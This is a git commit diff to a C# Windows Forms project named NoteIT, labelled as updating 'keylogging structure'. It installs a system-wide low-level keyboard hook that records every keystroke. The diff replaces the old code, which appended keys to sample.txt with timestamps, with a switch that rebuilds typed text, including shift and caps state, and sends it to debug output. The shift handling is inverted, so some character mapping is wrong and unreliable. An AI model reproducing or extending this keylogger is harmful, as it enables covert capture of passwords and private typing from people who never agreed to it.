a8b2e827b18307047f1454375bc935cfcbcb21ca
Tarun Kumar <sinnytk@github.com>
2019-05-12 06:19:46 +0500

    Update keylogging structure, shift and caps lock support

--- WindowsFormsApp1/WindowsFormsApp1/Subform.cs
+++ WindowsFormsApp1/WindowsFormsApp1/Subform.cs
@@ -15,6 +15,9 @@ namespace NoteIT
 {
     public partial class Subform : Form
     {
+        private static Keys[] notneeded = {Keys.LControlKey, Keys.RControlKey};
+        private static bool CapsPressed = Control.IsKeyLocked(Keys.CapsLock);
+        private static bool ShiftPressed;
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
@@ -47,266 +50,171 @@ namespace NoteIT
             {
 
                 int vkCode = Marshal.ReadInt32(lParam);
-                if (((Keys)vkCode).ToString() == "Space")
+                if (notneeded.Contains((Keys)vkCode))
                 {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(" ");
-                    sw.Close();
+                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                 }
-                else if (((Keys)vkCode).ToString() == "Return")
+                if (Keys.Shift == Control.ModifierKeys) ShiftPressed = true;
+                else ShiftPressed = false;
+                if ((Keys)vkCode == Keys.CapsLock)
                 {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    //sw.Write("\n");
-                    DateTime time = DateTime.Now;
-                    sw.Write("\n" + (time.ToString("MMM ddd d HH:mm yyyy")) + "\n");
-                    sw.Close();
+                    CapsPressed = !CapsPressed;
+                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                 }
-                else if (((Keys)vkCode).ToString() == "Back")
+                switch ((Keys)vkCode)
                 {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("~bksp~");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "OemPeriod")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(".");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Oemcomma")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(",");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "OemQuestion")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("?");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Oemtilde")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("`");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Add")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("+");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Subtract")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("-");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Multiply")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("*");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Divide")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("/");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "RControlKey")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("ctrl");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "LControlKey")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("ctrl");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "LShiftKey")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(" shift ");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "RShiftKey")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(" shift ");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "Decimal")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(".");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D0")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("0");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D1")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("1");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D2")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("2");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D3")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("3");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D4")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("4");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D5")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("5");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D6")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("6");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D7")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("7");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D8")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("8");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D9")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("9");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "D0")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("0");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad1")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("1");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad2")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("2");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad3")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("3");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad4")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("4");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad5")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("5");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad6")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("6");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad7")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("7");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad8")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("8");
-                    sw.Close();
-                }
-                else if (((Keys)vkCode).ToString() == "NumPad9")
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write("9");
-                    sw.Close();
-                }
-                else
-                {
-                    //Console.WriteLine((Keys)vkCode);
-                    StreamWriter sw = new StreamWriter(@"sample.txt", true);
-                    sw.Write(((Keys)vkCode).ToString());
-                    sw.Close();
+                    case Keys.Space:
+                        Debug.WriteLine(" ");
+                        break;
+                    case Keys.Return:
+                        Debug.WriteLine("\n");
+                        break;
+                    case Keys.Back:
+                        Debug.WriteLine("~bkspc~");
+                        break;
+                    case Keys.Tab:
+                        Debug.WriteLine("~TAB~");
+                        break;
+                    case Keys.D0:
+                        if (ShiftPressed) Debug.WriteLine("0");
+                        else Debug.WriteLine(")");
+                        break;
+                    case Keys.D1:
+                        if (ShiftPressed) Debug.WriteLine("1");
+                        else Debug.WriteLine("!");
+                        break;
+                    case Keys.D2:
+                        if (ShiftPressed) Debug.WriteLine("2");
+                        else Debug.WriteLine("@");
+                        break;
+                    case Keys.D3:
+                        if (ShiftPressed) Debug.WriteLine("3");
+                        else Debug.WriteLine("#");
+                        break;
+                    case Keys.D4:
+                        if (ShiftPressed) Debug.WriteLine("4");
+                        else Debug.WriteLine("$");
+                        break;
+                    case Keys.D5:
+                        if (ShiftPressed) Debug.WriteLine("5");
+                        else Debug.WriteLine("%");
+                        break;
+                    case Keys.D6:
+                        if (ShiftPressed) Debug.WriteLine("6");
+                        else Debug.WriteLine("^");
+                        break;
+                    case Keys.D7:
+                        if (ShiftPressed) Debug.WriteLine("7");
+                        else Debug.WriteLine("&");
+                        break;
+                    case Keys.D8:
+                        if (ShiftPressed) Debug.WriteLine("8");
+                        else Debug.WriteLine("*");
+                        break;
+                    case Keys.D9:
+                        if (ShiftPressed) Debug.WriteLine("9");
+                        else Debug.WriteLine("(");
+                        break;
+                    case Keys.LShiftKey:
+
+                    case Keys.RShiftKey:
+
+                        Debug.WriteLine("");
+                        break;
+                    case Keys.LControlKey:
+                    case Keys.RControlKey:
+                    case Keys.LMenu:
+                    case Keys.RMenu:
+                    case Keys.LWin:
+                    case Keys.RWin:
+                    case Keys.Delete:
+                        Debug.WriteLine("~Delete~");
+                        break;
+                    case Keys.OemQuestion:
+                        if (ShiftPressed) Debug.WriteLine("/");
+                        else Debug.WriteLine("?");
+                        break;
+                    case Keys.OemOpenBrackets:
+                        if (ShiftPressed) Debug.WriteLine("[");
+                        else Debug.WriteLine("{");
+                        break;
+                    case Keys.OemCloseBrackets:
+                        if (ShiftPressed) Debug.WriteLine("]");
+                        else Debug.WriteLine("}");
+                        break;
+                    case Keys.Oem1:
+                        if (ShiftPressed) Debug.WriteLine(";");
+                        else Debug.WriteLine(":");
+                        break;
+                    case Keys.Oem7:
+                        if (ShiftPressed) Debug.WriteLine("'");
+                        else Debug.WriteLine('"');
+                        break;
+                    case Keys.Oemcomma:
+                        if (ShiftPressed) Debug.WriteLine(",");
+                        else Debug.WriteLine("<");
+                        break;
+                    case Keys.OemPeriod:
+                        if (ShiftPressed) Debug.WriteLine(".");
+                        else Debug.WriteLine(">");
+                        break;
+                    case Keys.OemMinus:
+                        if (ShiftPressed) Debug.WriteLine("-");
+                        else Debug.WriteLine("_");
+                        break;
+                    case Keys.Oemplus:
+                        if (ShiftPressed) Debug.WriteLine("=");
+                        else Debug.WriteLine("+");
+                        break;
+                    case Keys.Oemtilde:
+                        if (ShiftPressed) Debug.WriteLine("`");
+                        else Debug.WriteLine("~");
+                        break;
+                    case Keys.Oem5:
+                        Debug.WriteLine("|");
+                        break;
+                    case Keys.Capital:
+                        {
+                            if (CapsPressed) CapsPressed = false;
+                            else CapsPressed = true;
+                        }
+                        break;
+                    case Keys.Left:
+                        Debug.WriteLine("~Left~");
+                        break;
+                    case Keys.Right:
+                        Debug.WriteLine("~Right~");
+                        break;
+                    case Keys.Up:
+                        Debug.WriteLine("~Up~");
+                        break;
+                    case Keys.Down:
+                        Debug.WriteLine("~Down~");
+                        break;
+                    case Keys.Home:
+                        Debug.WriteLine("~Home~");
+                        break;
+                    case Keys.End:
+                        Debug.WriteLine("~End~");
+                        break;
+                    case Keys.PageDown:
+                        Debug.WriteLine("~PageDown~");
+                        break;
+                    case Keys.PageUp:
+                        Debug.WriteLine("~PageUp~");
+                        break;
+                    case Keys.OemBackslash:
+                        if (ShiftPressed) Debug.WriteLine("|");
+                        else Debug.WriteLine("\\");
+                        break;
+                    default:
+                        {
+                            if (ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
+                            if (!ShiftPressed && CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
+                            if (ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToUpper());
+                            if (!ShiftPressed && !CapsPressed) Debug.WriteLine(((Keys)vkCode).ToString().ToLower());
+                        }
+                        break;
                 }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
